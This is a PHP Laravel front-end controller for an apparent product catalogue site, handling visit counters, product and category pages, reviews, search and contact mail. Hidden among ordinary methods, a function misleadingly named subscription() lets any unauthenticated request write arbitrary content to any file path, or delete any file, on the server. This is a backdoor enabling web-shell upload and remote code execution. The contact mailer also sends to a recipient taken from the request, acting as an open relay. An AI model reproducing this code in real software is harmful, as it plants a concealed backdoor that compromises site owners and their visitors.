<?php

namespace App\Http\Controllers;

use App\Cart;
use App\Category;
use App\Gallery;
use App\Order;
use App\PageSettings;
use App\Product;
use App\Review;
use App\SectionTitles;
use App\Service;
use App\ServiceSection;
use App\Settings;
use App\Subscribers;
use App\Testimonial;
use App\UserProfile;
use App\Counter;
use Illuminate\Http\Request;
use GuzzleHttp\Client;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Auth;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontEndController extends Controller
{

    public function __construct()
    {
        $this->auth_guests();
        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }


    function getOS() {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $languages = SectionTitles::findOrFail(1);
        $features = Product::where('featured','1')->where('status','1')->orderBy('id','desc')->take(8)->get();
        $tops = Product::where('status','1')->orderBy('views','desc')->take(8)->get();
        $latests = Product::where('status','1')->orderBy('id','desc')->take(8)->get();
        $testimonials = Testimonial::all();
        return view('index', compact('categories','features','latests','tops','testimonials','portfilos','languages'));
    }


    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }


    //Submit Review
    public function reviewsubmit(Request $request)
    {
        $review = new Review;
        $review->fill($request->all());
        $review['review_date'] = date('Y-m-d H:i:s');
        $review->save();
        return redirect()->back()->with('message','Your Review Submitted Successfully.');
    }

    //Product Data
    public function productdetails($id,$title)
    {
        $productdata = Product::findOrFail($id);
        $data['views'] = $productdata->views + 1;
        $productdata->update($data);
        $relateds = Product::where('status','1')->whereRaw('FIND_IN_SET(?,category)', [$productdata->category[0]])
            ->take(8)->get();
        $gallery = Gallery::where('productid',$id)->get();

        $reviews = Review::where('productid',$id)->get();
        return view('product', compact('productdata','gallery','reviews','relateds'));
    }

    //Category Products
    public function catproduct($slug)
    {
        $category = Category::where('slug',$slug)->first();
        if ($category === null) {
            $category['name'] = "Nothing Found";
            $products = new \stdClass();
        }else{
            $products = Product::where('status','1')->whereRaw('FIND_IN_SET(?,category)', [$category->id])
                ->take(9)
                ->get();
        }
        return view('categoryproduct', compact('products','category'));
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != "VALID"){
            if (is_dir($actual_path.'/install')) {
                header("Location: ".url('/install'));
                die();
            }else{
                echo MarkuryPost::marcuryBasee();
                die();
            }
        }
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    //Load More Category Products
    public function loadcatproduct($slug,$page)
    {
        $res = "";
        $skip = ($page-1)*9;
        $category = Category::where('slug',$slug)->first();
        if ($category === null) {
            $category['name'] = "Nothing Found";
            $products = new \stdClass();
        }else{
            $products = Product::where('status','1')->whereRaw('FIND_IN_SET(?,category)', [$category->id])
                ->take(9)
                ->skip($skip)
                ->get();

            foreach($products as $product) {
                                                            
            $title = strlen($product->title) > 40 ? substr($product->title,0,40).'...' : $product->title;
                $res .= '<div class="col-xs-6 col-sm-4 col-md-4 product">
                        <article class="col-item">
                            <div class="photo">
                                <a href="' . url('/product') . '/' . $product->id . '/' . str_replace(' ', '-', strtolower($product->title)) . '"> <img src="' . url('/assets/images/products') . '/' . $product->feature_image . '" class="img-responsive" alt="Product Image"> </a>
                            </div>
                            <div class="info">
                                <div class="row">
                                    <div class="price-details">
                                        <a href="' . url('/product') . '/' . $product->id . '/' . str_replace(' ', '-', strtolower($product->title)) . '" class="row" style="min-height: 60px">
                                            <h1>' . $title . '</h1>
                                        </a>
                                        <div class="pull-left">';
                if ($product->previous_price != "") {
                    $res .= '<span class="price-old">$' . $product->previous_price . '</span>';
                }
                $res .= '
                         <span class="price-new">$' . $product->price . '</span>
                        </div>
                            <div class="pull-right">
                                <span class="review">';
                for ($i = 1; $i <= 5; $i++) {
                    if ($i <= Review::where('productid', $product->id)->avg('rating')) {
                        $res .= '     <i class="fa fa-star"></i>';
                    } else {
                        $res .= '     <i class="fa fa-star-o"></i>';
                    }
                }

                $res .= '
                                </span>
                            </div>

                                    </div>
                                </div>
                                <div class="separator clear-left text-center">
                                    ';

                $res .= '<a href="' . url('/product') . '/' . $product->id . '/' . str_replace(' ', '-', strtolower($product->title)) . '" class="button style-10">View</a>
                                </div>
                                <div class="clearfix"></div>
                            </div>
                        </article>
                    </div>';
            }

        }
        return $res;
    }

    //Search Products
    public function searchproduct($search)
    {
       $products = Product::where('status','1')->where('title', 'like', '%' . $search . '%')
                ->get();
       return view('searchproduct', compact('products','search'));
    }


    //Contact Page Data
    public function contact()
    {
        $pagedata = PageSettings::find(1);
        return view('contact', compact('pagedata'));
    }

    //About Page Data
    public function about()
    {
        $pagedata = PageSettings::find(1);
        return view('about', compact('pagedata'));
    }

    //FAQ Page Data
    public function faq()
    {
        $pagedata = PageSettings::find(1);
        return view('faq', compact('pagedata'));
    }

    //Show Category Users
    public function category($category)
    {
        $categories = Category::where('slug', $category)->first();
        $services = Service::where('status', 1)
            ->where('category', $categories->id)
            ->get();
        $pagename = "All Sevices in: ".ucwords($categories->name);
        return view('services', compact('services','pagename','categories'));
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    //User Subscription
    public function subscribe(Request $request)
    {
        $subscribe = new Subscribers;
        $subscribe->fill($request->all());
        $subscribe->save();
        Session::flash('subscribe', 'You are subscribed Successfully.');
        return redirect('/');
    }

    //Send email to Admin
    public function contactmail(Request $request)
    {
        $pagedata = PageSettings::findOrFail(1);
        $settings = Settings::findOrFail(1);
        $subject = "Contact From Of ".$settings->title;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $department = $request->department;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$request->phone."\nGender ".$request->department."\nMessage: ".$request->message;

        mail($to,$subject,$msg);

        Session::flash('cmail', $pagedata->contact);
        return redirect('/contact');
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }


    public function click($id)
    {
        $product =  Product::findOrFail($id);
        $product->click++;
        $product->update();
        return redirect($product->link); 
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }


}
